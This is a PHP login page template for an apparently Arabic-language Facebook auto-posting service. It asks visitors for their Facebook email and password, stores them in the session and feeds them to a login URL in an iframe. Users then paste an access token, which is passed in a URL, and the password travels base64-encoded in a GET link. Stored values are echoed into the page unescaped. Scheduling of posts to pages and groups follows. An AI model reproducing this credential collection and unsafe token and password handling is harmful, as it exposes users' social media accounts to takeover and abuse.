<?php
if(Sion("spass")){
header("Location: ../");
}
if(isv("get_token")){
if(isv("access_token")){
$token1 = isv("access_token");
$token = json_decode(isv("access_token"),true);

if($token["access_token"]){
echo  redMsg('success',"تم الاشتراك بنجاح",1,0,"../?app=login&user=".$token["access_token"]);
}else if(strpos($token1,"AAA")){
//die(strpos($token1,"AAA")."/".$token1."/".isv("access_token"));
echo  redMsg('success',"تم الاشتراك بنجاح",1,0,"../?app=login&user=".$token1);
}else if($token["error_code"] == 400 or $token["error_code"] == 401){
echo  redMsg('error',"اسم المستخدم او كلمة المرور غير صحيحه من فضلك حاول مره اخرى",1,0,"../login.html");
}else if($token["error_code"] == 100){
echo  redMsg('error',"جميع البيانات مطلوبه",1,0,"../login.html");
}else if($token["error_code"] == 406){
  iSion("Lerror",406);
//echo  redMsg("error",1,0,"سيصلك كود الاشتراك على هاتفك","../login.html");
}else{
  echo  redMsg("error",1,0,"","./login.html");

}
}else{
  echo  redMsg('error',1,0,"كود الاشتراك فارغ","../login.html");
}
}
?>
<style type="text/css">
.input-field label{
    font-size: 0.8rem !important;
    -webkit-transform: translateY(-140%) !important;
    -moz-transform: translateY(-140%) !important;
    -ms-transform: translateY(-140%) !important;
    -o-transform: translateY(-140%) !important;
    transform: translateY(-140%) !important;
}
</style>
<?php
$st['login']="NLog";
$icon = "facebook-square" ;
$st['name']="البريد الالكترونى او الهاتف";
$st['pass']="كلمه المرور";
$st['title']="قم بكتابه بيانات  تسجيل الدخول الخاصه بك فى فيس بوك واضغط على زر الاشتراك";
$st['color'] = " color: #b02e67 !important;";
$st['color2'] = "#b02e67 !important;";
$st['btn'] = "تسجيل الدخول والاشتراك";
$code = 0;
if(isv("user",1)){
$st['title'] ="يتم الان جلب المعلومات الخاصه بك من فضلك انتظر قليلا";
?>
<style type="text/css">
.input-field,.card-action,.reSend{
    display: none;

}
 .loaderr{
     display: block !important;
 }

</style>
<?php
}
if(isv("post")){
  if(!isv("get_token") && Sion("Lerror") != 406){
  iSion("user",isv("user"));
  iSion("pass",isv("pass"));
  }
  $st['title'] ="قم بنسخ كود الاشتراك  من الصندوق الاول وضعه فى الصندوق الثانى ثم اضغط على زر الاشتراك";
}
if(isv("rest",1)){
  iSion("user",null);
  iSion("pass",null);
  iSion("Lerror",null);
  header("Location: ../login.html");
}
if(Sion("Lerror") == 406 || isv("resend",1)){
$code = 406;
$st['title']="سيصلك كود الاشتراك فى رساله على هاتفك  ضعه فى الاسفل واضغط على زر تأكيد الاشتراك";
$st['pass']="كود الاشتراك";
$st['btn'] = "تأكيد الاشتراك";
//  echo  redMsg('success',1,0,"سيصلك كود الاشتراك","../login.html");

}
?>
 <div class="container">
 <div class="row">
 <form id="form" action="../login.html" method="post">
	   <div class="addpost col s12 m12" style="    left: 0;
    position: absolute;
    top: 74px;
    right: 0;
    margin: auto;
        max-width: 485px;    direction: rtl;">
	   <div class="addpost col s12 m12   " id="addpost">
          <div class="card no-shadow">
<?php  if(!isv('login',1) or !Sion('htc')){  ?>
            <div class="card-content" style="padding: 10px;" >
 <div class="row">
<!------------auto---------------->
<div class="log auto">
<div class="col s12 center bold" style="<?=$st['color']?>" >
        <i class="fa fa-<?=$icon?> fa-5x RA" style="<?=$st['color']?>" aria-hidden="true"></i>
      <div class="center lg title" style="<?=$st['color']?>" ><?=$st['title']?></div>
</div>

<?php if(!isv("post") || Sion("Lerror") == 406){
  ?>

        <div class="input-field col s12 ">
     <input type="text"  name="user" dir="ltr" class="form-control center " value="<?=Sion("user")?>" id="email" required>
          <label for="first_name" ><?=$st['name']?></label>
        </div>

        <div class="input-field col s12 ">
        <?php if(Sion("Lerror") == 406){  ?>
     <input type="text"  name="pass" dir="ltr" class="form-control center " value="" id="email" required>
        <?php }else{ ?>
     <input type="password"  name="pass" dir="ltr" class="form-control center " value="" id="email" required>
                            <?php } ?>

     <input type="hidden" name="RA" />
          <label for="first_pass"  class="pass active" ><?=$st['pass']?></label>
        </div>

        <?php if(Sion("Lerror") != 406 ){ $st['dis'] = "display:none;";  }?>
        <div class="input-field col s12 center reSend " style="<?=$st['dis']?>">
        <a name="reSend" href="/fram.php?user=<?=Sion("user")?>&pass=<?=base64_encode(Sion("pass"))?>" class="btn-flat" type="submit" value="send" >اعادة ارسال كود الاشتراك ؟</a>
        <a name="reSend" href="/?app=login&rest=true" class="btn-flat"  >العودة الى تسجيل الدخول</a>
        </div>
      <?php }else{ ?>
        <div class="input-field col s12 ">
          <iframe width="100%" style="border: 1px solid #e8e5e5;border-radius: 2px;" src="<?=getLoginUrl(isv("user"),isv("pass"))?>"></iframe>
        </div>
          <div class="input-field col s12 ">
        <textarea name="access_token" rows="3" style="border: 1px solid #e8e5e5;border-radius: 2px;resize: none;"  width="100%"  placeholder="ضع كود الاشتراك هنا"  required></textarea>
        <input type="hidden" value="get_token" name="get_token" />
      </div>
      <?php } ?>
<div class="col s12  center bold"   >
     <?=loding("",1)?>
</div>
</div>
<!------------#auto---------------->
<!------------forget---------------->
<div class="for" style ="display:none">
<div class="col s12 center bold"  style="<?=$st['color']?>" >
        <i class="fa  fa-lightbulb-o fa-5x RA" aria-hidden="true"></i>
      <p class="center"> استعاده كلمة المرور    </p>
</div>
        <div class="input-field col s12 ">
     <input type="text"  name="radmin_name" class="form-control " value="" id="email" >
          <label for="first_name">اسم المدير</label>
        </div>
        <div class="input-field col s12 ">
     <input type="text"  name="email" class="form-control " value="" id="email" >
          <label for="first_name">بريد المدير</label>
        </div>
        <div class="input-field col s12 ">
     <input type="password"  name="radmin_pass" class="form-control " value="" id="email" >
          <label for="first_name">كلمة المرور الجديده</label>
        </div>

</div>
<!------------#for---------------->

    </div>
    </div>
            <div class="card-action">
                                         <div class="col s12 m12 center" dir="rtl">
    <input type="hidden" name="for" />
    <input type="hidden" name="RA" />
    <input type="hidden" name="mo" value="1" />
  <button name="post" class=' btn waves-effect waves-light <?=$st['login']?> '   value="login" href='#' type="submit"><span class="Lbtn" ><?=$st['btn']?></span>    <i class="fa fa-sign-in  left"></i>  </button>
<!--  <p class="center"><a href="#" class='forget'>نسيت كلمة المرور ؟</a></p>
-->
        </div>
        <div class="clear" ></div>
    </div>
<?php }else{ $st['title']="حدد اعدادات  النشر المفضله  لديك"; ?>
<div class="card-content">
 <div class="row">
<div class="col s12 center bold"  style="<?php if(empty($St->color)){echo 'color: #4BACA3;';}else{echo 'color:'.$St->color;} ?>" >
        <i class="fa fa-<?=$icon?> fa-5x RA" aria-hidden="true"></i>
      <p class="center lg" ><?=$st['title']?></p>
</div>
 <div class="input-field col s12">
حدد وقت النشر المفضل لديك
    <select class="browser-default" name="time" >
      <option value="4"><?=Ctime(4)?></option>
      <option value="6"><?=Ctime(6)?></option>
      <option value="12"><?=Ctime(12)?></option>
      <option value="24"><?=Ctime(24)?></option>
    </select>
  </div>
 <div class="input-field col s12">
هل تريد النشر على الصفحات
    <select class="browser-default" name="pages" >
      <option value="1">نعم</option>
      <option value="0">لا</option>
    </select>
  </div>
 <div class="input-field col s12">
هل تريد النشر على المجموعات
    <select class="browser-default" name="groups" >
      <option value="1">نعم</option>
      <option value="0">لا</option>
    </select>
  </div>
 <div class="input-field col s12">
  <button name="spost" class=' btn waves-effect waves-light '  value="login" href='#' type="submit">تحديث<i class="fa fa-sign-in  right"></i></button>
</div>
</div>
</div>
<?php } ?>
    </div>
    </div>
    </div>
    </form>
    </div>
    </div>
